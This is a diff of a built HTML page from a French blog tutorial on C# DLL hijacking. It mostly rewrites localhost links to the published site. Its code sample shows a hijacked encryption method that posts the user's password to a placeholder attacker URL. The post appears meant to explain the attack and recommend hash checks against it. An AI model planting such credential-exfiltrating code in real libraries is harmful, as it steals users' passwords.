@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+<head>
     
 
 
@@ -20,7 +20,7 @@
 
 
 
-<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+<script defer language="javascript" type="text/javascript" src="/vozec.fr/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
 
 
 
@@ -70,17 +70,17 @@
 <meta name="twitter:description" content="Voici comment Détourner une DLL C# Part1" />
 
 
-<base href="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll/" />
-<link rel="canonical" href="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll/" itemprop="url" />
-<meta name="url" content="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll/" />
-<meta name="twitter:url" content="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll/" />
-<meta property="og:url" content="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll/" />
+<base href="https://vozec.github.io/vozec.fr/posts/pourquoi-vous-devez-securiser-vos-dll/" />
+<link rel="canonical" href="https://vozec.github.io/vozec.fr/posts/pourquoi-vous-devez-securiser-vos-dll/" itemprop="url" />
+<meta name="url" content="https://vozec.github.io/vozec.fr/posts/pourquoi-vous-devez-securiser-vos-dll/" />
+<meta name="twitter:url" content="https://vozec.github.io/vozec.fr/posts/pourquoi-vous-devez-securiser-vos-dll/" />
+<meta property="og:url" content="https://vozec.github.io/vozec.fr/posts/pourquoi-vous-devez-securiser-vos-dll/" />
 
 
 <meta property="og:updated_time" content="2021-10-25T12:00:00Z" />
 
 
-<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://vozec.github.io/vozec.fr/sitemap.xml' />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -106,7 +106,7 @@
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+<link type="text/css" rel="stylesheet" href="/vozec.fr/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
 
 
     
@@ -172,12 +172,12 @@
         <div class="sidebar-about">
     <h1 class="brand">
         
-            <a href="//localhost:1313/">
+            <a href="https://vozec.github.io/vozec.fr/">
                 <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
             </a>
         
         
-            <a href="//localhost:1313/">
+            <a href="https://vozec.github.io/vozec.fr/">
                 <h1>Vozec&#39;s Blog</h1>
             </a>
         
@@ -1027,7 +1027,7 @@
         <p class="footnote">
 powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
     <br>
-    &copy; 2024 . All rights reserved.
+    &copy; 2025 . All rights reserved.
 </p>
 
   </div>
@@ -1037,7 +1037,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
                 <div class="post">
   <div class="info">
   <h1 class="post-title">
-    <a href="//localhost:1313/posts/pourquoi-vous-devez-securiser-vos-dll/">Pourquoi il faut sécuriser vos DLL P1</a>
+    <a href="https://vozec.github.io/vozec.fr/posts/pourquoi-vous-devez-securiser-vos-dll/">Pourquoi il faut sécuriser vos DLL P1</a>
   </h1>
 
   <div class="headline">
@@ -1061,11 +1061,11 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
     <ul class="tags">
       
       <li class="tag-reverse">
-        <a href="//localhost:1313/tags/reverse">reverse</a>
+        <a href="https://vozec.github.io/vozec.fr/tags/reverse">reverse</a>
       </li>
       
       <li class="tag-tuto">
-        <a href="//localhost:1313/tags/tuto">tuto</a>
+        <a href="https://vozec.github.io/vozec.fr/tags/tuto">tuto</a>
       </li>
       
     </ul>
@@ -1097,7 +1097,7 @@ Le but d&rsquo;une Dll Hijacking est de remplacé la véritable bibliothèque pa
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C#" data-lang="C#"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> CHIFFREMENT(<span style="color:#66d9ef">string</span> motdepasse,<span style="color:#66d9ef">string</span> clé)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  HttpClient client = <span style="color:#66d9ef">new</span> HttpClient()
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> postdata = <span style="color:#66d9ef">new</span> Dictionary&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt;{{ <span style="color:#e6db74">&#34;MDP_Volé&#34;</span>, motdepasse },};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">var</span> postdata = <span style="color:#66d9ef">new</span> Dictionary&lt;<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">string</span>&gt;<span style="color:#960050;background-color:#1e0010">\</span>{<span style="color:#960050;background-color:#1e0010">\</span>{ <span style="color:#e6db74">&#34;MDP_Volé&#34;</span>, motdepasse <span style="color:#960050;background-color:#1e0010">\</span>},<span style="color:#960050;background-color:#1e0010">\</span>};
 </span></span><span style="display:flex;"><span>  client.PostAsync(<span style="color:#e6db74">&#34;https://MON-URL-Pour-VOLER-LE-MDP&#34;</span>, <span style="color:#66d9ef">new</span> FormUrlEncodedContent(postdata));
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>  Mon algorithme de chiffrement super sécurisée
@@ -1179,11 +1179,11 @@ On peut calculer un Hash pour chaque dépendance et ainsi vérifier l&rsquo;int�
 <div class="footer">
     
 	    
-            <a class="previous-post" href="//localhost:1313/posts/comment-reverse-du-.net-facilement/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Comment Reverse du .Net facilement</a>
+            <a class="previous-post" href="https://vozec.github.io/vozec.fr/posts/comment-reverse-du-.net-facilement/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Comment Reverse du .Net facilement</a>
         
 	    
             <div class="next-post">
-                <a href="//localhost:1313/posts/pourquoi-votre-wifi-est-vuln%C3%A9rable/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Comment casser un mot de passe Wifi</a>
+                <a href="https://vozec.github.io/vozec.fr/posts/pourquoi-votre-wifi-est-vuln%C3%A9rable/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Comment casser un mot de passe Wifi</a>
             </div>
         
     
